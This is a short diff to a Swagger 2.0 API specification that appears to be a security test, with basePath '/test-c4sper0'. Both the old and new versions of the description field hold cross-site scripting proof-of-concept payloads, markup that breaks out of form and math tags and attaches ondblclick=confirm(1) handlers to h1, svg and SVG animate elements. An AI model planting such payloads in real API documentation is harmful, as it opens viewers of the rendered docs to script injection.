@@ -1,7 +1,10 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <form><math>'>"<h1 ondblclick=confirm(1);>BU0</h1></math></form><svg src="https://raw.githubusercontent.com/0xc4sper0/T3stApi/refs/heads/main/Api.svg"/onload"" ondblclick=confirm(1);></svg>
+  description: <form><math>'>"<h1 ondblclick="confirm(1)">BU0</h1></math></form><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <animate attributeName="opacity" from="0" to="1" begin="0s" dur="0.1s" fill="freeze" 
+    ondblclick="confirm(1)"/>
+</svg>
 
   version: production
 basePath: /test-c4sper0
